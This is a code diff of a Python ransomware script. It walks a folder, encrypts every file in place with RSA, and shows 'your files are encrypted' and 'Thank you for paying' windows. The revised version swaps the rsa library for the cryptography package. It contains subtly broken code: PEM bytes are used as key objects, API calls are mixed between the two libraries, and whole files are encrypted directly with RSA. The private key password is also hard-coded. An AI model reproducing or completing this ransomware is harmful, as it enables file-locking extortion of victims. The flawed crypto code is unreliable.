@@ -1,73 +1,96 @@
-import rsa, sys, os
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding
+import os, rsa, sys, colorama
 import tkinter as tk
-import colorama
-colorama.init()
 
-def generate_key_pair():
-    
+dir = os.path.dirname(os.path.realpath(__file__)) # get current directory
+
+def gen_key():
     try:
-        with open('public.pem', 'r') as f:
-            public_key = rsa.PublicKey.load_pkcs1(f.read().encode())
-        with open('private.pem', 'r') as f:
-            private_key = rsa.PrivateKey.load_pkcs1(f.read().encode())
-        print(colorama.Fore.CYAN + "[i] - Keys loaded successfully")
-        return public_key, private_key
+        privkey = open(f"{dir}/private.key","rb").read() # check if private key exists
+        pubkey = open(f"{dir}/public.key","rb").read() # check if public key exists 
+
+        return privkey, pubkey
     except:
         pass
     
-    (public_key, private_key) = rsa.newkeys(2048)
-    with open('public.pem', 'w+') as f:
-        f.write(public_key.save_pkcs1().decode())
-    with open('private.pem', 'w+') as f:
-        f.write(private_key.save_pkcs1().decode())
-    return public_key, private_key
-
-def encrypt(data, key):
-    encrypted_data = b""
-    chunk_size = 256
-
-    for i in range(0, len(data), chunk_size):
-        chunk = data[i:i + chunk_size]
-        encrypted_chunk = rsa.encrypt(chunk, key)
-        encrypted_data += encrypted_chunk
-        
-    return encrypted_data
-        
-def decrypt(data, key):
-    decrypted_data = b""
-    chunk_size = 256
-
-    try:
-        for i in range(0, len(data), chunk_size):
-            chunk = data[i:i + chunk_size]
-            if len(chunk) < chunk_size:
-                chunk_size = len(chunk)
-            decrypted_chunk = rsa.decrypt(chunk, key)
-            decrypted_data += decrypted_chunk
-            
-    except Exception as e:
-        print(colorama.Fore.YELLOW + "[!] - Error: {}".format(e))
-        
-    return decrypted_data
-
-def read_n_write(key, mode, folder='./ransom_directory'):
-
-    files = os.walk(folder)
+    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048) # generate private key
     
-    try:
-        for path, _, file_names in files:
-            for file_name in file_names:
-                file_path = os.path.join(path, file_name)
-                with open(file_path, 'rb') as f:
-                    data = f.read()
-                with open(file_path, 'wb') as f:
-                    if mode == 'encrypt':
-                        f.write(encrypt(data, key))
-                    else:
-                        f.write(decrypt(data, key))
-    except Exception as e:
-        print(colorama.Fore.YELLOW + "[!] - Error: {}".format(e))
-        exit(1)
+    with open(f"{dir}/private.key","wb") as f: # write private key to file
+        k = priv.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.PKCS8,
+            encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword') # password used to encrypt private key (see ransomware/decrypt.py)
+        )
+        privkey = k
+        f.write(k)
+
+    with open(f"{dir}/public.key","wb") as f: # write public key to file
+        k = priv.public_key().public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.PKCS1,
+        )
+        pubkey = k
+        f.write(k)
+        
+    return privkey, pubkey
+        
+    
+
+dir = os.path.dirname(os.path.realpath(__file__)) # get current directory
+
+def encrypt(filename, public_key):
+    with open(f"{dir}/{filename}", "rb") as f: # read file to encrypt
+        encrypted = public_key.encrypt(
+            f.read(), 
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            ) 
+        ) # encrypt file (OAEP padding scheme with SHA256 hash algorithm and no label)
+
+    with open(f"{dir}/{filename}", "wb") as f: # write encrypted file to disk
+        f.write(encrypted)
+        
+def decrypt(filename, private_key):
+    with open(f"{dir}/{filename}", "rb") as f: # read file to decrypt
+        decrypted = private_key.decrypt(
+            f.read(), 
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            ) 
+        ) # decrypt file (OAEP padding scheme with SHA256 hash algorithm and no label)
+
+    with open(f"{dir}/{filename}", "wb") as f: # write decrypted file to disk
+        f.write(decrypted)
+        
+def get_tree_file():
+    
+    files = []
+    
+    for path, _, file_names in os.walk(f"{dir}/ransom_directory"):
+        for file_name in file_names:
+            file_path = os.path.join(path, file_name)
+            files.append(file_path)
+            
+    return files
+
+def encrypt_all():
+    
+    privkey, pubkey = gen_key() # generate key pair
+    
+    for file in get_tree_file(): # encrypt all files in ransom_directory
+        encrypt(file, pubkey)
+        
+def decrypt_all():
+    
+    privkey, pubkey = gen_key() # generate key pair
+    
+    for file in get_tree_file(): # decrypt all files in ransom_directory
+        decrypt(file, privkey)
 
 def your_files_are_encrypted():
     root = tk.Tk()
@@ -87,7 +110,7 @@ def thank_you():
     try:
         root = tk.Tk()
         root.title("Thank you")
-        root.geometry("300x100")
+        root.geometry("700x500")
         root.configure(background='green')
         
         label = tk.Label(root, text="Thank you for paying", font=("Arial", 15))
@@ -98,25 +121,18 @@ def thank_you():
     except Exception as e:
         print(colorama.Fore.RED + "[!] - Error: {}".format(e))
 
-def main(mode='encrypt'):
-    
-    public_key, private_key = generate_key_pair()
-    
-    try:
-        if sys.argv[1] == 'decrypt':
-            mode = 'decrypt'
-    except:
-        pass
-    
-    if mode == 'encrypt':
-        print(colorama.Fore.RED + "[i] - Encrypting your files...")
-        read_n_write(public_key, mode)
-        your_files_are_encrypted()
-        
-    elif mode == 'decrypt':
-        print(colorama.Fore.GREEN + "[i] - Decrypting your files...")
-        read_n_write(private_key, mode)
-        thank_you()
+if __name__ == "__main__":
 
-if __name__ == '__main__':
-    main()
+    try:
+        if sys.argv[1] == "encrypt":
+            encrypt_all()
+            your_files_are_encrypted()
+            print("Files encrypted")
+        elif sys.argv[1] == "decrypt":
+            decrypt_all()
+            thank_you()
+            print("Files decrypted")
+        else:
+            print("Usage: python3 main.py [encrypt|decrypt]")
+    except:
+        print("Usage: python3 main.py [encrypt|decrypt]")
